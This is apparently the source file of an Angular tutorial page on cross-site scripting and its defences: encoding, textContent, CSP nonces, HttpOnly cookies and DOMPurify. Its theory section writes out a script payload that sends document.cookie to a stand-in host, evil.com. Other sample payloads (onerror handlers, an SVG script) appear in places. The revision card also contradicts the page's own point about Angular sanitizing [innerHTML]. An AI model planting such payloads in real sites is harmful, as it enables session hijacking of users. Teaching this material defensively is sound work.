import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PageMetaComponent } from '../../../shared/page-meta/page-meta';
import { QuickRefComponent, QuickRefItem } from '../../../shared/quick-ref/quick-ref';
import { TheoryBlockComponent, TheoryPoint } from '../../../shared/theory-block/theory-block';
import { CodeBlockComponent, CodeTab } from '../../../shared/code-block/code-block';
import { CommonMistakesComponent, CommonMistake } from '../../../shared/common-mistakes/common-mistakes';
import { ChallengeBlockComponent, Challenge } from '../../../shared/challenge-block/challenge-block';
import { QuizBlockComponent, QuizQuestion } from '../../../shared/quiz-block/quiz-block';
import { QnaBlockComponent, QnaItem } from '../../../shared/qna-block/qna-block';
import { RevisionCardComponent, RevisionSummary } from '../../../shared/revision-card/revision-card';
import { PageCompleteComponent } from '../../../shared/page-complete/page-complete';

const quickRef: QuickRefItem[] = [
  { name: 'XSS',          type: 'keyword', desc: 'Cross-Site Scripting — injecting malicious scripts into a page viewed by other users.' },
  { name: 'Stored XSS',   type: 'keyword', desc: 'Payload persisted in DB and rendered to every user who views the page.' },
  { name: 'Reflected XSS', type: 'keyword', desc: 'Payload echoed from URL/form input in the response — requires user to click a crafted link.' },
  { name: 'DOM XSS',      type: 'keyword', desc: 'Client-side code writes attacker-controlled data directly to the DOM without sanitization.' },
  { name: 'CSP',          type: 'keyword', desc: 'Content Security Policy — browser header that restricts script sources, preventing inline XSS.' },
  { name: 'innerText',    type: 'keyword', desc: 'Safe alternative to innerHTML — sets text content, not HTML; special characters are escaped.' },
];

const theory: TheoryPoint[] = [
  {
    heading: 'XSS Attack Types',
    points: [
      'Stored XSS: attacker submits <code>&lt;script&gt;document.location=\'https://evil.com/steal?\'+document.cookie&lt;/script&gt;</code> as a comment. The server stores it and serves it to every user who views that page.',
      'Reflected XSS: attacker sends victim a link like <code>https://bank.com/search?q=&lt;script&gt;stealCookies()&lt;/script&gt;</code>. The server includes the <code>q</code> value in the response HTML without escaping.',
      'DOM XSS: client-side JavaScript reads `location.hash` or `location.search` and writes it to `innerHTML` or `document.write` — the script runs in the victim\'s browser without hitting the server.',
      'Impact: cookie theft (session hijacking), keylogging, credential phishing overlays, cryptocurrency mining, redirecting users to malicious sites.',
    ],
  },
  {
    heading: 'Primary Defenses',
    points: [
      'Output encoding: HTML-encode all user-controlled data before inserting into HTML context — `&`, `<`, `>`, and `"` each become their own named HTML entity (see the Output Encoding code tab for the exact entity names). Context matters: HTML body, HTML attribute, JS string, and URL each require different encoding.',
      'Use safe APIs: `element.textContent = userInput` (safe) vs `element.innerHTML = userInput` (dangerous). React, Angular, and Vue escape by default — do not use `dangerouslySetInnerHTML` or `[innerHTML]` with user input.',
      'Content Security Policy (CSP): HTTP header `Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-abc123\'` — browsers refuse to execute inline scripts and scripts from unlisted sources.',
      'HttpOnly cookies: mark session cookies `HttpOnly` — JavaScript cannot read them even if XSS executes. Reduces impact of cookie theft.',
    ],
  },
  {
    heading: 'Content Security Policy (CSP)',
    points: [
      'CSP is the last line of defence — it limits XSS impact even when injection occurs. It does NOT prevent injection; it limits execution.',
      'Strict CSP: `Content-Security-Policy: default-src \'none\'; script-src \'self\' \'nonce-{random}\'; style-src \'self\' \'nonce-{random}\'; img-src \'self\' data:`. Generate a new nonce per request.',
      'Never use `unsafe-inline` — it negates CSP protection for scripts. If you need inline styles, use nonces.',
      'Report-only mode: `Content-Security-Policy-Report-Only` — enforces nothing but reports violations to a URL, allowing you to test a new policy without breaking the site.',
    ],
  },
  {
    heading: 'Framework-Specific Protections',
    points: [
      'Angular: template binding `{{ userInput }}` is safe — Angular escapes HTML. `[innerHTML]="userInput"` IS sanitized by default too — Angular strips <code>&lt;script&gt;</code> tags, event-handler attributes (`onerror`, `onclick`, `onload`), and `javascript:` URLs before inserting the value. The real danger is `DomSanitizer.bypassSecurityTrustHtml()`, which explicitly disables that sanitization — never call it on untrusted user content.',
      'React: JSX `{userInput}` is safe. `dangerouslySetInnerHTML={{ __html: userInput }}` is dangerous — use DOMPurify if you must render user HTML.',
      'Server-side rendering: escape output in templates. Handlebars `{{userInput}}` escapes; `{{{userInput}}}` does not. Same pattern in Jinja2, EJS, Razor.',
    ],
  },
  {
    heading: 'DOM-Based XSS',
    points: [
      'DOM-based XSS differs from reflected/stored XSS in that the malicious payload never touches the server at all — it exists entirely in client-side JavaScript that unsafely writes attacker-controlled data (from the URL, localStorage, or a postMessage) directly into the DOM via a dangerous sink like innerHTML.',
      'Common dangerous sinks include innerHTML, outerHTML, document.write(), and eval() — any code path that takes untrusted data and interprets it as HTML or executable JavaScript rather than plain text is a potential DOM XSS vector.',
      'Because DOM-based XSS never appears in server logs or server-rendered responses, it can be harder to detect with traditional server-side security scanning — client-side static analysis tools and careful code review of DOM-manipulation code paths are necessary to catch it.',
      'The same core defense applies as with other XSS types: avoid dangerous sinks entirely where possible, and when genuinely necessary, sanitize untrusted content with a well-tested library (DOMPurify) rather than attempting custom escaping logic, which frequently misses edge cases.',
    ],
  },
];

const codeTabs: CodeTab[] = [
  {
    label: 'Output Encoding',
    language: 'typescript',
    code: `// ── Server-side HTML encoding (Node.js / Express) ───────────────────────────
function encodeHtml(str: string): string {
  return str
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

// ── Rendered in template ─────────────────────────────────────────────────────
// UNSAFE: res.send(\`<p>Hello \${req.query.name}</p>\`);
// SAFE:
res.send(\`<p>Hello \${encodeHtml(req.query.name as string)}</p>\`);

// ── Client-side DOM manipulation ─────────────────────────────────────────────
const userInput = '<img src=x onerror="alert(1)">';

// DANGEROUS:
document.getElementById('output')!.innerHTML = userInput;

// SAFE: textContent treats the string as text, not HTML
document.getElementById('output')!.textContent = userInput;

// ── When you MUST render HTML (e.g., rich text from CMS) use DOMPurify ───────
import DOMPurify from 'dompurify';
const sanitized = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS:  ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR:  ['href', 'class'],
  ALLOW_DATA_ATTR: false,
});
document.getElementById('content')!.innerHTML = sanitized; // safe`,
  },
  {
    label: 'Content Security Policy (Express)',
    language: 'typescript',
    code: `import helmet from 'helmet';
import crypto from 'crypto';

// ── CSP with per-request nonce (helmet) ──────────────────────────────────────
app.use((req, res, next) => {
  // Generate a fresh nonce for every response
  res.locals['cspNonce'] = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc:     ["'none'"],
    scriptSrc:      ["'self'", (req: any, res: any) => \`'nonce-\${res.locals['cspNonce']}'\`],
    styleSrc:       ["'self'", (req: any, res: any) => \`'nonce-\${res.locals['cspNonce']}'\`],
    imgSrc:         ["'self'", 'data:', 'https://cdn.example.com'],
    connectSrc:     ["'self'"],
    fontSrc:        ["'self'"],
    objectSrc:      ["'none'"],   // no Flash/plugins
    frameAncestors: ["'none'"],   // clickjacking protection
    baseUri:        ["'self'"],
    formAction:     ["'self'"],
    reportUri:      ['/api/csp-report'],
  },
}));

// ── Include nonce in rendered HTML ───────────────────────────────────────────
// In your template: <script nonce="<%= nonce %>">...</script>
// Express:
app.get('/', (req, res) => {
  res.render('index', { nonce: res.locals['cspNonce'] });
});

// ── Report-only mode for testing ─────────────────────────────────────────────
// app.use(helmet.contentSecurityPolicy({ directives: {...}, reportOnly: true }));

// ── CSP violation endpoint ───────────────────────────────────────────────────
app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.warn('CSP violation:', req.body);
  res.status(204).end();
});`,
  },
];

const mistakes: CommonMistake[] = [
  {
    title: 'Using innerHTML with user-controlled data',
    wrong: `element.innerHTML = userComment; // executes any <script> or onerror= in userComment`,
    right: `element.textContent = userComment; // treats as text, no HTML parsing
// Or if HTML is needed:
element.innerHTML = DOMPurify.sanitize(userComment);`,
    explanation: '`innerHTML` parses the string as HTML and executes any scripts or event handlers. `textContent` treats the string as literal text — special characters are automatically escaped. Always prefer `textContent`; use DOMPurify when you genuinely need to render HTML.',
  },
  {
    title: 'Calling bypassSecurityTrustHtml() on untrusted user content',
    wrong: `<!-- bypassSecurityTrustHtml() explicitly disables Angular's own sanitizer -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userContent)"></div>`,
    right: `<!-- Plain [innerHTML] is already sanitized by Angular -- safe as-is -->
<div [innerHTML]="userContent"></div>
<!-- Only bypass if Angular's sanitizer strips content you've verified is safe -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(userContent))"></div>`,
    explanation: 'Angular already sanitizes `[innerHTML]` bindings by default — it strips `<script>` tags and `on*` event-handler attributes. `bypassSecurityTrustHtml()` exists to tell Angular "trust this string completely," which disables that protection outright. Calling it on untrusted user content, not plain `[innerHTML]` binding, is the actual mistake.',
  },
  {
    title: 'CSP with unsafe-inline — negates script protection',
    wrong: `Content-Security-Policy: script-src 'self' 'unsafe-inline'`,
    right: `Content-Security-Policy: script-src 'self' 'nonce-abc123'
<!-- Generate a fresh nonce per response, reference it on <script> tags -->`,
    explanation: '`unsafe-inline` allows any inline `<script>` tag and event handler attributes — it completely disables CSP script protection. Use nonces instead: a per-request random value that must appear on legitimate `<script>` tags.',
  },
  {
    title: 'Not setting HttpOnly on session cookies',
    wrong: `res.cookie('session', token); // accessible to JavaScript — XSS can steal it`,
    right: `res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict' });`,
    explanation: 'Without `HttpOnly`, JavaScript (including injected XSS scripts) can read the session cookie via `document.cookie`. `HttpOnly` makes the cookie invisible to JavaScript while still sending it in HTTP requests.',
  },
];

const challenge: Challenge = {
  title: 'HTML Encoder',
  language: 'typescript',
  description: `Implement encodeForHtml(input: string): string that safely encodes these 5 characters for HTML output:
- & → &amp;
- < → &lt;
- > → &gt;
- " → &quot;
- ' → &#x27;
This prevents XSS when inserting user input into HTML context.`,
  hints: [
    'Use String.replace() with a global regex for each character',
    'Replace & first (before replacing other chars with &-prefixed entities)',
  ],
  starterCode: `function encodeForHtml(input: string): string {
  // TODO
  return input;
}`,
  solution: `function encodeForHtml(input: string): string {
  return input
    .replace(/&/g,  '&amp;')   // must be first
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

console.log(encodeForHtml('<script>alert("xss")</script>'));
// &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;

console.log(encodeForHtml('Alice & Bob\'s "special" <offer>'));
// Alice &amp; Bob&#x27;s &quot;special&quot; &lt;offer&gt;`,
};

const quiz: QuizQuestion[] = [
  {
    q: 'What is the safest way to insert user-supplied text into the DOM?',
    options: [
      'element.innerHTML with encodeURIComponent first',
      'element.textContent — treats the value as literal text, no HTML parsing',
      'document.write() with the encoded string',
      'element.outerHTML = sanitize(userInput)',
    ],
    answer: 1,
    explanation: '`element.textContent` sets the text content of a node — the browser never parses it as HTML, so `<script>` and `onerror=` attributes are treated as literal text. It is the safest way to insert user content into the DOM.',
  },
  {
    q: 'What does `Content-Security-Policy: script-src \'none\'` do?',
    options: [
      'Blocks all network requests',
      'Prevents any JavaScript from executing on the page — both inline and external',
      'Only blocks third-party scripts',
      'Removes all script tags from the HTML',
    ],
    answer: 1,
    explanation: '`script-src \'none\'` tells browsers to refuse to execute any JavaScript on the page — neither inline `<script>` tags, event handlers (`onclick=`), nor external scripts. Useful for pages that intentionally have no JavaScript (e.g., email templates, static error pages).',
  },
  { q: 'What is DOM-based XSS and how does it differ from reflected XSS?', options: ['DOM-based XSS affects only the client; reflected XSS affects only the server', 'In DOM-based XSS, the payload never reaches the server; the JavaScript reads a DOM source (location.hash, document.URL) and writes to a DOM sink without sanitization; reflected XSS involves the server echoing unsanitized input in the response', 'DOM-based XSS is stored in the DOM storage; reflected XSS is reflected off the URL', 'Reflected XSS is more dangerous because the server is involved; DOM XSS is less severe'], answer: 1, explanation: 'Reflected XSS: attacker crafts a URL with the payload in a query parameter. The server includes the raw parameter in the HTML response. The browser executes the script. DOM-based XSS: the malicious payload is in the URL fragment (#) or another DOM source. JavaScript reads location.hash and writes it to innerHTML without sanitization. The payload never reaches the server — it exists entirely in the browser DOM. Example: page.html#<img src=x onerror=alert(1)>. JavaScript: element.innerHTML = location.hash.slice(1). Server logs show only page.html (no payload visible in logs). Harder to detect with server-side WAFs because the payload does not transit the server. Test using the browser console and DOM XSS scanners.' },
  { q: 'What is a stored XSS attack and what makes it more dangerous than reflected XSS?', options: ['Stored XSS is stored in the browser cache; reflected XSS is reflected in the URL', 'Stored XSS persists the payload in a database or server storage; when other users view the affected page, their browsers execute the attacker script without any phishing action required', 'Reflected XSS is more dangerous because it affects the server; stored XSS only affects browser storage', 'Stored XSS can only steal cookies; reflected XSS can perform any browser action'], answer: 1, explanation: 'Stored (persistent) XSS: the attacker submits a comment, profile name, or message containing a script. The server stores it in a database without sanitization. When other users view the page containing the stored content, the browser executes the attacker script. No phishing link needed — the attack runs automatically for every user who visits the page. More dangerous because: broader impact (affects all users who view the content, not just those tricked into clicking a link). Self-propagating (can spread to more pages if the payload creates new posts). Persistent (the attack continues until the stored content is removed). Classic examples: a forum post with a script that steals session cookies. A profile name that triggers XSS in an admin panel (XSS worm).' },
  { q: 'What are dangerouslySetInnerHTML in React and innerHTML in vanilla JS and why are they XSS risks?', options: ['These APIs render text content and are safe because browsers sanitize the input automatically', 'These APIs set raw HTML, treating the content as markup rather than text, allowing injected scripts or event handlers to execute if the content contains attacker-supplied data', 'dangerouslySetInnerHTML is XSS-safe; innerHTML is only risky in Internet Explorer', 'These APIs are risky only when the content comes from the current user, not when rendering content from other users'], answer: 1, explanation: 'innerHTML and dangerouslySetInnerHTML parse the provided string as HTML and inject it into the DOM. If the string contains <script> or event handler attributes (<img onerror=attack()>), the browser executes them. Safe alternatives: textContent / innerText: sets the text content of an element without HTML parsing. The content is escaped automatically. React JSX: {userInput} renders user content as text. React escapes HTML entities automatically. When you need to render HTML: use a sanitizer (DOMPurify) before setting innerHTML: element.innerHTML = DOMPurify.sanitize(rawHtml). DOMPurify removes dangerous elements and attributes while preserving safe HTML. The sanitizer configuration must be reviewed (allow-list of safe tags and attributes, not denylist).' },
  { q: 'What is CSP nonce and how does it allow inline scripts while preventing XSS?', options: ['A nonce is a session token in CSP that validates the current user before scripts run', 'A random per-response value included in both the CSP script-src nonce-{value} directive and the script tag nonce attribute; scripts without the matching nonce are blocked even if injected by an attacker', 'A nonce is a Content-Type validation token that prevents script type confusion', 'A CSP nonce is used to sign external scripts from CDNs, preventing script substitution'], answer: 1, explanation: 'CSP nonce mechanism: server generates a random cryptographic nonce per response: nonce = secureRandom().base64(). Sets: Content-Security-Policy: script-src nonce-{nonce}. Adds the nonce to every legitimate inline script: <script nonce=abc123>. The browser executes only scripts with the matching nonce attribute. An XSS payload injected by an attacker: <script>malicious code</script> has no nonce attribute and is blocked. Why nonces work: the attacker cannot predict the nonce (generated fresh each response). Even if the attacker injects a script tag, it has no valid nonce. Requirements: nonces must be cryptographically random (not sequential or predictable). Nonces must not be reused across responses. Never include user-supplied data in the nonce.' },
];

const qna: QnaItem[] = [
  {
    q: 'What is the difference between stored, reflected, and DOM-based XSS?',
    a: '<strong>Stored XSS</strong>: payload is persisted in the database and rendered to every user who views the page — most dangerous because no user interaction required after initial injection. <strong>Reflected XSS</strong>: payload is in a URL parameter; the server echoes it in the response HTML — attacker must trick the victim into clicking a crafted link. <strong>DOM XSS</strong>: client-side JavaScript reads attacker-controlled input (URL fragment, form field) and writes it to <code>innerHTML</code> or <code>document.write</code> — the server is never involved; purely browser-side.',
  },
  {
    q: 'Does Angular automatically protect against XSS?',
    a: 'Angular\'s template binding <code>{{ value }}</code> and property bindings like <code>[textContent]="value"</code> are safe — Angular escapes HTML. <code>[innerHTML]="value"</code> is ALSO sanitized by default: Angular strips <code>&lt;script&gt;</code> tags, dangerous event-handler attributes (<code>onerror</code>, <code>onclick</code>, <code>onload</code>), and <code>javascript:</code> URLs before inserting the value. The real danger is <code>DomSanitizer.bypassSecurityTrustHtml()</code> — it exists to tell Angular "trust this string completely," which disables sanitization outright. Never call it on untrusted user content; if Angular\'s sanitizer strips HTML you\'ve verified is safe, sanitize with DOMPurify first, then bypass Angular\'s now-redundant check.',
  },
  { q: 'How do you prevent XSS in an Angular application?', a: 'Angular XSS protection: built-in sanitization: Angular automatically sanitizes values bound to DOM properties. Template binding {{ userInput }} escapes HTML entities. [innerHTML] binding sanitizes the HTML using Angular DomSanitizer. Angular marks HTML as safe only after sanitization. Security risk patterns: using DomSanitizer.bypassSecurityTrustHtml() bypasses sanitization — only use for known-safe HTML from trusted sources. Using ElementRef.nativeElement.innerHTML directly bypasses Angular sanitization. Using document.write() or eval() with untrusted data. Safe patterns: never call bypassSecurityTrustHtml() with user-supplied content. Use Angular template binding for all user data. If rich text is needed, sanitize with DOMPurify before passing to bypassSecurityTrustHtml(). Content Security Policy: set a strict CSP as a defense in depth. Angular applications use nonce-based CSP for inline styles and scripts.' },
  { q: 'What is XSS via SVG and what makes SVG uploads particularly dangerous?', a: 'SVG (Scalable Vector Graphics) files are XML-based and can contain embedded JavaScript: <code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/svg&gt;</code>. Whether the browser executes that script depends on the RENDERING CONTEXT, not just the Content-Type header: displayed via <code>&lt;img src="upload.svg"&gt;</code>, the image-rendering context suppresses script execution completely — the embedded script never runs. Opened via direct navigation (a link straight to the file URL), or embedded via <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, or <code>&lt;iframe&gt;</code>, the browser treats it as an active XML document and DOES execute the script. Attack surface: any "view full size" or "download" link that navigates straight to the stored file, or an embed widget using object/iframe — not a plain avatar <code>&lt;img&gt;</code> tag by itself. Mitigations: serve SVG files from a separate, cookieless origin with a restrictive CSP (script-src none). Sanitize SVG content server-side before storing (remove script elements and event handlers using an SVG-aware sanitizer). Convert SVG to PNG on upload if SVG is not needed. Set Content-Disposition: attachment on the direct file-serving route so navigating to it prompts a download instead of rendering it inline.' },
  { q: 'What is mutation XSS (mXSS) and why is it a challenge for sanitizers?', a: 'Mutation XSS: HTML sanitizers parse and clean HTML, but the browser re-parses the sanitized HTML and produces a different DOM (due to HTML parser quirks). The re-parsed DOM contains XSS payloads that the sanitizer thought it removed. Example: the sanitizer allows table elements and removes script. A crafted input exploits the difference between how the sanitizer parses and how the browser parses, causing the sanitizer to see safe HTML while the browser produces executable script. Historical mXSS attacks: nested HTML comments that confuse parsers. Malformed HTML entities that sanitizers do not decode but browsers do. CDATA sections parsed differently in HTML vs SVG vs MathML namespaces. Mitigations: use mature, actively maintained sanitizers (DOMPurify has extensive mXSS protection). Keep sanitizer libraries updated. After sanitization, have the sanitizer re-parse the output to verify no XSS survived (DOMPurify does this with inner serialization).' },
  { q: 'How should you sanitize HTML in a rich text editor feature?', a: 'Rich text editor XSS prevention: the challenge: rich text editors (Quill, TipTap, ProseMirror) allow users to create formatted content with HTML structure. The application must store and render this HTML, creating XSS risk. Server-side sanitization: use a robust HTML sanitizer server-side before storing: DOMPurify (JavaScript/Node.js). Bleach (Python). HtmlSanitizer (.NET). Configure the sanitizer with a strict allowlist: allowed tags (p, strong, em, ul, li, a, h1-h6, br, blockquote). Allowed attributes (a href — validate URL scheme, style — restrict to safe properties). Prohibited: script, object, iframe, embed, form, input. Prohibited attributes: onload, onerror, onclick, and all event handlers. Client-side sanitization as defense in depth: sanitize before display using DOMPurify in the browser. Use a CSP to limit what scripts can run. URL validation: in href attributes, allow only http:// and https:// (block javascript: URLs).' },
];

const revision: RevisionSummary = {
  oneLiner: 'XSS = injecting scripts into pages — defend with output encoding, textContent over innerHTML, CSP nonces, and HttpOnly cookies; DOMPurify when user HTML is required.',
  mustKnow: [
    'Stored: payload in DB, served to all users; Reflected: in URL, served back; DOM: client-side innerHTML',
    'Use textContent, not innerHTML — browser treats textContent as literal text',
    'HTML encode: & < > " \' before inserting user data into HTML',
    'CSP: script-src \'nonce-xxx\' restricts inline scripts — never unsafe-inline',
    'HttpOnly cookies: JavaScript (including XSS) cannot read them',
    'Angular {{ }} and React JSX {} are safe; [innerHTML] and dangerouslySetInnerHTML are not',
  ],
  interviewFocus: [
    'What is the difference between stored and reflected XSS?',
    'How does Content Security Policy reduce XSS impact?',
    'Why does HttpOnly on cookies help with XSS?',
  ],
};

@Component({
  selector: 'app-sec-xss',
  standalone: true,
  imports: [CommonModule, PageMetaComponent, QuickRefComponent, TheoryBlockComponent,
    CodeBlockComponent, CommonMistakesComponent, ChallengeBlockComponent,
    QuizBlockComponent, QnaBlockComponent, RevisionCardComponent, PageCompleteComponent],
  templateUrl: './xss.html',
  styleUrl: './xss.scss',
})
export class SecXss {
  quickRef = quickRef; theory = theory; codeTabs = codeTabs;
  mistakes = mistakes; challenge = challenge; quiz = quiz; qna = qna; revision = revision;
}

